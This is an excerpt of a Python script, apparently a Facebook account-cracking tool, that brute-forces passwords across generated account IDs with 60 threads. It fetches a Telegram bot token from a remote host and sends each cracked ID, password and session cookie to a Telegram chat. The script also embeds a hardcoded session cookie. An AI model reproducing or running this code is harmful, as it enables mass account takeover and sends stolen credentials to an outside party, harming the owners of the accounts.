...
#device=random.choice(model11)
#print(device)
model11=requests.get("http://devilsofficial.xyz/version/server1.txt").text

def rakib(sid,ps,sua):
    try:
        import requests
        token = str(model11)#Add yout token 
        chatid = "6079524541"#Add your Chat Id
        cookie = "datr=C0_oZUSTEq-H-JMYAjggfay1;sb=C0_oZYPT0uh2uttMniin7IzZ;fr=0r5mb4DPfXQX9sFRd.AWXBEEWORqObibeIsoH6XxI6lLQ.Bl6CiS..AAA.0.0.Bl6E9M.AWU1w8S2jVY;ps_l=0;ps_n=0;c_user=61557098638152;xs=20%3ASS1doUiHn29EPQ%3A2%3A1709723469%3A-1%3A-1"
        nams = "HD UA     "
        ok_id =str(sid+"|"+ps+"|"+sua)
...
def fike(__UBI___,sid,ps,coki):
    try:
        ...
        cookie = "datr=C0_oZUSTEq-H-JMYAjggfay1;sb=C0_oZYPT0uh2uttMniin7IzZ;fr=0r5mb4DPfXQX9sFRd.AWXBEEWORqObibeIsoH6XxI6lLQ.Bl6CiS..AAA.0.0.Bl6E9M.AWU1w8S2jVY;ps_l=0;ps_n=0;c_user=61557098638152;xs=20%3ASS1doUiHn29EPQ%3A2%3A1709723469%3A-1%3A-1"
        nams = "HD UA     "
        ok_id =str(nams+":-    "+__UBI___()+"    🆔  ”  "+sid+"|"+ps+"|"+coki)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
...
def rndm1():
    ...
    for nmbr in range(limit):
        ...
        uid.append(nmp)
    with devilswork(max_workers=60) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('[◽] Total Acounts : '+tl)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                #open('/sdcard/DEVILS-IDS/Random/devil-lock.txt', 'a').write(uid+'|'+ps+'|'+coki+'\n')
